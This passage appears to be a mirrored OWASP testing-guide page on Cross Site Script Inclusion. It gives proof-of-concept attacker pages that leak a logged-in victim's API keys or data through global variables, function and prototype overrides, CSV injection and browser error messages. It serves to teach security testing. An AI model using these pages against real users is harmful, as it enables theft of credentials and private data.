                <p>An API key is stored in a JavaScript file with the URI <code class="language-plaintext highlighter-rouge">https://victim.com/internal/api.js</code> on the victim’s website, <code class="language-plaintext highlighter-rouge">victim.com</code>, which is only accessible to authenticated users. An attacker configures a website, <code class="language-plaintext highlighter-rouge">attackingwebsite.com</code>, and uses the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag to refer to the JavaScript file.</p>
                
                <p>Here are the contents of <code class="language-plaintext highlighter-rouge">https://victim.com/internal/api.js</code>:</p>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                  <span class="nb">window</span><span class="p">.</span><span class="nx">secret</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">supersecretUserAPIkey</span><span class="dl">"</span><span class="p">;</span>
                <span class="p">})();</span>
                </code></pre></div></div>
                
                <p>The attack site, <code class="language-plaintext highlighter-rouge">attackingwebsite.com</code>, has an <code class="language-plaintext highlighter-rouge">index.html</code> with the following code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
                <span class="nt">&lt;html&gt;</span>
                  <span class="nt">&lt;head&gt;</span>
                    <span class="nt">&lt;title&gt;</span>Leaking data via global variables<span class="nt">&lt;/title&gt;</span>
                  <span class="nt">&lt;/head&gt;</span>
                  <span class="nt">&lt;body&gt;</span>
                    <span class="nt">&lt;h1&gt;</span>Leaking data via global variables<span class="nt">&lt;/h1&gt;</span>
                    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://victim.com/internal/api.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;script&gt;</span>
                      <span class="kd">var</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">);</span>
                      <span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Your secret data &lt;b&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">secret</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/b&gt;</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nt">&lt;/script&gt;</span>
                  <span class="nt">&lt;/body&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>In this example, a victim is authenticated with <code class="language-plaintext highlighter-rouge">victim.com</code>. An attacker lures the victim to <code class="language-plaintext highlighter-rouge">attackingwebsite.com</code> via social engineering, phishing emails, etc. The victim’s browser then fetches <code class="language-plaintext highlighter-rouge">api.js</code>, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p>
                
                <h3 id="2-sensitive-data-leakage-via-global-function-parameters">2. Sensitive Data Leakage via Global Function Parameters</h3>
                
                <p>This example is similar to the previous one, except in this case <code class="language-plaintext highlighter-rouge">attackingwebsite.com</code> uses a global JavaScript function to extract the sensitive data by overwriting the victim’s global JavaScript function.</p>
                
                <p>Here are the contents of <code class="language-plaintext highlighter-rouge">https://victim.com/internal/api.js</code>:</p>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                  <span class="kd">var</span> <span class="nx">secret</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">supersecretAPIkey</span><span class="dl">"</span><span class="p">;</span>
                  <span class="nb">window</span><span class="p">.</span><span class="nx">globalFunction</span><span class="p">(</span><span class="nx">secret</span><span class="p">);</span>
                <span class="p">})();</span>
                </code></pre></div></div>
                
                <p>The attack site, <code class="language-plaintext highlighter-rouge">attackingwebsite.com</code>, has an <code class="language-plaintext highlighter-rouge">index.html</code> with the following code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
                <span class="nt">&lt;html&gt;</span>
                  <span class="nt">&lt;head&gt;</span>
                    <span class="nt">&lt;title&gt;</span>Leaking data via global function parameters<span class="nt">&lt;/title&gt;</span>
                  <span class="nt">&lt;/head&gt;</span>
                  <span class="nt">&lt;body&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;script&gt;</span>
                      <span class="kd">function</span> <span class="nx">globalFunction</span><span class="p">(</span><span class="nx">param</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">);</span>
                        <span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Your secret data: &lt;b&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">param</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/b&gt;</span><span class="dl">"</span><span class="p">;</span>
                      <span class="p">}</span>
                    <span class="nt">&lt;/script&gt;</span>
                    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://victim.com/internal/api.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                  <span class="nt">&lt;/body&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see <a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf">The Unexpected Dangers of Dynamic JavaScript</a>.</p>
                
                <h3 id="3-sensitive-data-leakage-via-csv-with-quotations-theft">3. Sensitive Data Leakage via CSV with Quotations Theft</h3>
                
                <p>To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada’s <a href="https://www.mbsd.jp/Whitepaper/xssi.pdf">Identifier based XSSI attacks</a> whitepaper.</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
                Content-Type: text/csv
                Content-Disposition: attachment; filename="a.csv"
                Content-Length: xxxx
                
                1,"___","aaa@a.example","03-0000-0001"
                2,"foo","bbb@b.example","03-0000-0002"
                ...
                98,"bar","yyy@example.net","03-0000-0088"
                99,"___","zzz@example.com","03-0000-0099"
                </code></pre></div></div>
                
                <p>In this example, using the <code class="language-plaintext highlighter-rouge">___</code> columns as injection points and inserting JavaScript strings in their place has the following result.</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
                2,"foo","bbb@b.example","03-0000-0002"
                ...
                98,"bar","yyy@example.net","03-0000-0088"
                99,"*/}//","zzz@example.com","03-0000-0099"
                </code></pre></div></div>
                
                <p><a href="https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html">Jeremiah Grossman wrote about a similar vulnerability in Gmail</a> in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
                <span class="nt">&lt;html&gt;</span>
                  <span class="nt">&lt;head&gt;</span>
                    <span class="nt">&lt;title&gt;</span>Leaking gmail contacts via JSON <span class="nt">&lt;/title&gt;</span>
                  <span class="nt">&lt;/head&gt;</span>
                  <span class="nt">&lt;body&gt;</span>
                    <span class="nt">&lt;script&gt;</span>
                      <span class="kd">function</span> <span class="nb">Array</span><span class="p">()</span> <span class="p">{</span>
                        <span class="c1">// steal data</span>
                      <span class="p">}</span>
                    <span class="nt">&lt;/script&gt;</span>
                    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://mail.google.com/mail/?_url_scrubbed_"</span><span class="nt">&gt;&lt;/script&gt;</span>
                  <span class="nt">&lt;/body&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <h3 id="4-sensitive-data-leakage-via-javascript-runtime-errors">4. Sensitive Data Leakage via JavaScript Runtime Errors</h3>
                
                <p>Browsers normally present standardized <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors">JavaScript error messages</a>. However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website <code class="language-plaintext highlighter-rouge">victim.com</code> serves the following content at the URI <code class="language-plaintext highlighter-rouge">http://victim.com/service/csvendpoint</code> for authenticated users:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
                Content-Type: text/csv
                Content-Disposition: attachment; filename="a.csv"
                Content-Length: 13
                
                1,abc,def,ghi
                </code></pre></div></div>
                
                <p>This vulnerability could be exploited with the following:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--error handler --&gt;</span>
                <span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="nx">err</span><span class="p">)}</span><span class="nt">&lt;/script&gt;</span>
                <span class="c">&lt;!--load target CSV --&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://victim.com/service/csvendpoint"</span><span class="nt">&gt;&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:</p>

                
                <h3 id="5-sensitive-data-leakage-via-prototype-chaining-using-this">5. Sensitive Data Leakage via Prototype Chaining Using <code class="language-plaintext highlighter-rouge">this</code></h3>
                
                <p>In JavaScript, the <code class="language-plaintext highlighter-rouge">this</code> keyword is dynamically scoped. This means if a function is called upon an object, <code class="language-plaintext highlighter-rouge">this</code> will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from <a href="http://sebastian-lekies.de/leak/">Sebastian Leike’s demonstration page</a>, the sensitive data is stored in an Array. An attacker can override <code class="language-plaintext highlighter-rouge">Array.prototype.forEach</code> with an attacker-controlled function. If some code calls the <code class="language-plaintext highlighter-rouge">forEach</code> function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with <code class="language-plaintext highlighter-rouge">this</code> pointing to the object that contains the sensitive data.</p>
                
                <p>Here is an excerpt of a JavaScript file containing sensitive data, <code class="language-plaintext highlighter-rouge">javascript.js</code>:</p>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
                <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                  <span class="kd">var</span> <span class="nx">secret</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">578a8c7c0d8f34f5</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">345a8b7c9d8e34f5</span><span class="dl">"</span><span class="p">];</span>
                
                  <span class="nx">secret</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">)</span> <span class="p">{</span>
                    <span class="c1">// do something here</span>
                  <span class="p">});</span>  
                <span class="p">})();</span>
                <span class="p">...</span>
                </code></pre></div></div>
                
                <p>The sensitive data can be leaked with the following JavaScript code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
                 <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;</span>
                
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;script&gt;</span>
                      <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">forEach</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">resultString</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Your secret values are: &lt;b&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">length</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                          <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">resultString</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">, </span><span class="dl">"</span><span class="p">;</span>
                          <span class="p">}</span>
                          <span class="nx">resultString</span> <span class="o">+=</span> <span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
                        <span class="p">}</span>
                        <span class="nx">resultString</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">&lt;/b&gt;</span><span class="dl">"</span><span class="p">;</span>
                        <span class="kd">var</span> <span class="nx">div</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">result</span><span class="dl">"</span><span class="p">);</span>
                        <span class="nx">div</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">resultString</span><span class="p">;</span>
                      <span class="p">};</span>
                    <span class="nt">&lt;/script&gt;</span>
                    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://victim.com/..../javascript.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                ...
                </code></pre></div></div>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

